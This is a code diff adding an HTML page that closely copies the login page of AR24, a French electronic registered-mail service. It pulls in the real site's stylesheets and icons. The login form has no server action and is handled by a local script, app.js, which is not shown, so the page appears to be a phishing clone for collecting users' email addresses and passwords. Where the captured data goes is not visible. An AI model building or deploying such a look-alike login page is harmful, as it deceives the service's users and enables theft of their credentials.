@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<!--[if IE 7]><html class="ie ie7" lang="fr" class="no-js"> <![endif]-->
+<!--[if IE 8]><html class="ie ie8" lang="fr" class="no-js"> <![endif]-->
+<!--[if !(IE 7) | !(IE 8)  ]><!-->
+<html lang="fr" class="no-js">
+  <!--<![endif]-->
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <title>Connexion &nbsp;- AR24</title>
+    
+    <!-- Lien vers les fichiers CSS originaux (inchangés) -->
+    <link
+      rel="stylesheet"
+      href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617"
+    />
+    <link rel="icon" type="image/png" href="https://app.ar24.fr/static/images/favicon.png" />
+    <meta name="theme-color" content="#0000FF" />
+    <meta name="description" content="" />
+    <link
+      href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link rel="stylesheet" href="footer.css" />
+  </head>
+  <body class="guest">
+    <noscript>
+      <div
+        style="
+          z-index: 100;
+          text-align: center;
+          line-height: 2em;
+          background-color: #c0392b;
+          color: white;
+          font-weight: 500;
+          position: fixed;
+          top: 40px;
+          left: 50%;
+          transform: translateX(-50%);
+          padding: 20px 30px;
+        "
+      >
+        <div>
+          JavaScript n'est pas activé pour le site d'AR24. Il est nécessaire au bon
+          fonctionnement de nos services.
+        </div>
+        <div>
+          <a
+            href="https://app.ar24.fr/fr/page/javascript"
+            style="color: inherit; border-bottom: 1px solid"
+            >Suivre les instructions pour activer JavaScript</a
+          >
+        </div>
+      </div>
+    </noscript>
+
+    <header id="header">
+      <div class="wrapper">
+        <a href="https://app.ar24.fr" class="header-logo">AR24 - Lettre Recommandée Électronique</a>
+        <button id="open-mobile-menu" class="btn btn-ghost small" title="Ouvrir le menu">Menu</button>
+        <nav aria-label="Main Navigation">
+          <button id="close-mobile-menu" class="btn btn-ghost small" title="Fermer le menu">&#x2716;</button>
+          <ul>
+            <li>
+              <a href="https://app.ar24.fr/fr/user/register" id="btn_free_try" class="btn btn-primary small fw-500"
+                >Inscription</a
+              >
+            </li>
+            <li>
+              <a href="https://app.ar24.fr/fr/user/login" class="btn small fw-500 active">Se connecter</a>
+            </li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main-content">
+      <div class="col-small">
+        <header>
+          <h1 class="align-center">Connexion</h1>
+        </header>
+        <section class="content">
+          <div class="card margin-auto">
+            <!-- Formulaire de connexion -->
+            <form id="login">
+
+              <label for="ide_id" class="fw-500">Adresse e-mail</label>
+              <input type="email" id="ide_id" name="ide" placeholder="Ex : monadresse@email.fr" required autocomplete="new-password" />
+              <label for="pwd_id" class="fw-500">Mot de passe</label>
+              <div class="input-container">
+                <input
+                  class="password"
+                  type="password"
+                  id="pwd_id"
+                  name="pwd"
+                  autocomplete="new-password"
+                  placeholder="Votre mot de passe"
+                  required
+                />
+                <i id="visibilityBtn">
+                  <span id="icon">
+                    <img alt="" class="icon" src="/static/images/icons/eye.svg" />
+                  </span>
+                </i>
+              </div>
+              <div class="display-flex mt-m">
+                <input type="checkbox" id="remember-me" name="persistent" value="1" />
+                <label for="remember-me">Se souvenir de moi</label>
+              </div>
+              <p class="align-center mt-m">
+                <input class="btn btn-primary" type="submit" value="Connexion" title="Connexion" aria-label="Se connecter" />
+              </p>
+            </form>
+            <p id="form-message" aria-live="polite"></p>
+          </div>
+          <div class="mt-m align-right">
+            <a
+              href="https://app.ar24.fr/fr/page/forgot"
+              class="btn-link"
+              aria-label="Cliquez ici pour être redirigé vers la procédure de réinitialisation de votre mot de passe dans le cas où vous l'auriez oublié"
+              >Réinitialiser mon mot de passe</a
+            >
+            <a
+              href="https://app.ar24.fr/fr/user/register"
+              class="btn-link ml-s"
+              aria-label="Cliquez ici pour être redirigé vers la page d'inscription d'AR24"
+              >Créer un compte</a
+            >
+          </div>
+        </section>
+      </div>
+    </main>
+
+    <footer id="footer" class="site-footer">
+      <div class="wrapper">
+        <div class="footer-brand">
+          <a href="https://app.ar24.fr" aria-label="AR24 - accueil" class="footer-logo">AR24</a>
+          <p>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.<br />AR24 est une filiale de Docaposte</p>
+          <div class="footer-partners" aria-label="Partenaires">
+            <span>LA<br /><strong>FRENCH TECH</strong></span>
+            <span>Région<br /><strong>Alsace</strong></span>
+            <span><strong>Syntec</strong><br />NUMÉRIQUE</span>
+          </div>
+        </div>
+        <div class="footer-grid">
+          <div class="footer-contact">
+            <a href="tel:+333811690545">08 11 69 05 45</a>
+            <span>(0.05€/min + prix appel)</span>
+            <small>Du lundi au vendredi<br />de 9h00 à 17h30 en continu</small>
+          </div>
+          <nav aria-label="Liens AR24">
+            <a href="https://app.ar24.fr/fr/user/login">Se connecter</a>
+            <a href="https://app.ar24.fr/fr/">Accueil</a>
+            <a href="https://app.ar24.fr/fr/page/about">Qui sommes-nous ?</a>
+            <a href="https://app.ar24.fr/fr/page/advantages">Avantages</a>
+            <a href="https://app.ar24.fr/fr/page/certifications">Certifications</a>
+            <a href="https://app.ar24.fr/fr/page/contact">Contact</a>
+          </nav>
+          <nav aria-label="Aide">
+            <a href="https://app.ar24.fr/fr/page/faq">Pour qui ?</a>
+            <a href="https://app.ar24.fr/fr/page/faq">FAQ</a>
+            <a href="https://app.ar24.fr/fr/page/knowledge">Base de connaissances</a>
+            <a href="https://app.ar24.fr/fr/page/proofs">Vérifier mes preuves</a>
+            <a href="https://app.ar24.fr/fr/page/email-verification">Vérifier un email</a>
+            <a href="https://app.ar24.fr/fr/page/status">Etat du service</a>
+          </nav>
+          <nav aria-label="Informations légales">
+            <a href="https://app.ar24.fr/fr/page/cgu">CGU</a>
+            <a href="https://app.ar24.fr/fr/page/legal-notices">Mentions légales</a>
+            <a href="https://app.ar24.fr/fr/page/privacy">Politique de confidentialité : inscription</a>
+            <a href="https://app.ar24.fr/fr/page/subprocessors">Sous-traitants ultérieurs</a>
+            <a href="https://app.ar24.fr/fr/page/cookies">Paramètres des cookies</a>
+            <a href="https://app.ar24.fr/fr/page/accessibility">Accessibilité : partiellement conforme</a>
+          </nav>
+          <div class="footer-meta">
+            <div class="languages" aria-label="Choisir la langue">
+              <a href="?lang=fr" aria-label="Français" class="flag flag-fr">F</a>
+              <a href="?lang=en" aria-label="English" class="flag flag-en">UK</a>
+              <a href="?lang=nl" aria-label="Nederlands" class="flag flag-nl">N</a>
+            </div>
+            <p>Tous droits réservés<br />AR24 2026</p>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Script de la page -->
+    <script src="app.js"></script>
+  </body>
+</html>
